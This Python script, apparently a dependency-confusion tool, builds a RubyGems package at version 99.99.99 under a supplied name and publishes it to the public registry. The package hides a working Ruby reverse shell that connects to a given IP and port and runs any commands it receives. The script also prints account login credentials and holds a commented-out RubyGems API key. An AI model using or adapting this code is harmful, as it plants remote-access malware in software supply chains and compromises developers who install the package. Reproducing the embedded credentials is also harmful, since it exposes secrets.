import sys
import os



if len(sys.argv) != 4:
    print("\nUsage: python3 confusedgem.py <gem name> <ip> <port>")
    sys.exit()

maliciousgemname = sys.argv[1]
ip=sys.argv[2]
port=sys.argv[3]

print("The creds to upload are stark0de@protonmail.com:gemconfusion")

#creds='''
#---
#:rubygems_api_key: rubygems_4e3a5cf5fcb775c016e03d5d2ee25b9aa7095f1593beebb8
#:status: :ok\n'''
#credfile = open(os.getenv("HOME")+"/.gem/credentials", "w")
#credfile.write(creds)
#os.system("chmod 0600 "+os.getenv("HOME")+"/.gem/credentials")


gemspec='''Gem::Specification.new do |s|
  s.name        = '{}'
  s.version     = '99.99.99'
  s.summary     = "Sample gem for our Rails project"
  s.description = "A test gem"
  s.authors     = ["Dr. Who"]
  s.email       = 'drwho@gmail.com'
  s.files       = ["lib/{}.rb"]
  s.homepage    =
    'https://rubygems.org/gems/{}'
  s.license       = 'MIT'
end\n
'''.format(maliciousgemname,maliciousgemname,maliciousgemname)

#print(gemspec)

f = open("{}.gemspec".format(maliciousgemname), "a")
f.write(gemspec)
f.close()

try:
   os.mkdir(os.getcwd()+"/lib")
except:
   print("Creation of dir failed")
   
reverse_shell='''
class {}

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "{}"
#Set the Remote Host Port
PORT = "{}"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{{RHOST}}", "#{{PORT}}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{{line}}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end
  end
rescue
  retry
end
end
'''.format(maliciousgemname.capitalize(),ip,port)
#print(reverse_shell)
f2 = open("lib/{}.rb".format(maliciousgemname),"a")
f2.write(reverse_shell)
f2.close()

os.system("gem build {}.gemspec".format(maliciousgemname))
os.remove("{}.gemspec".format(maliciousgemname))
os.remove("lib/{}.rb".format(maliciousgemname))
os.rmdir("lib")

print("Success! Now uploading malicious Gem to RubyGems")

os.system("gem push {}-99.99.99.gem".format(maliciousgemname))

print("Successfully published gem")

os.remove("{}-99.99.99.gem".format(maliciousgemname))

print("To remove the gem use: gem yank {} -v 99.99.99".format(maliciousgemname))
